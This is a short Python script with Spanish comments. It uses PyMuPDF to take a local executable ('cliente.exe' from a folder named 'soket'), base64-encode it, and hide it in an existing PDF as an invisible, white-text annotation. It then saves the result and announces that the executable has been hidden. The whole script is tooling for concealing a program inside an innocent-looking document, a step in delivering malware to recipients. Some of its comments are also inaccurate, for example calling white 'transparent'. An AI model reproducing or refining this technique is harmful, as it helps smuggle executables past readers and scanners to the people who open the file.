import fitz  # PyMuPDF
import base64

# Ruta del archivo PDF existente
pdf_path = 'C:\\Users\\garra\\Documents\\git\\soket\\stocek\\dist\\pd.pdf'

# Ruta del archivo ejecutable
executable_path = 'C:\\Users\\garra\\Documents\\git\\soket\\stocek\\dist\\cliente.exe'

# Leer el archivo ejecutable en modo binario
with open(executable_path, 'rb') as exec_file:
    exec_data = exec_file.read()
    exec_data_b64 = base64.b64encode(exec_data).decode('utf-8')

# Abrir el archivo PDF
pdf_document = fitz.open(pdf_path)

# Añadir el ejecutable como un anotación en la primera página
pdf_document[0].add_redact_annot(
    quad=fitz.Rect(0, 0, 0, 0),  # Rectángulo invisible
    text_color=(1, 1, 1),  # Color transparente
    text=f"/Base64Data {exec_data_b64}"
)

# Guardar el PDF modificado
output_pdf_path = 'C:\\Users\\garra\\Documents\\git\\soket\\stocek\\dist\\new.pdf'
pdf_document.save(output_pdf_path)

print(f'El ejecutable ha sido ocultado en {output_pdf_path}')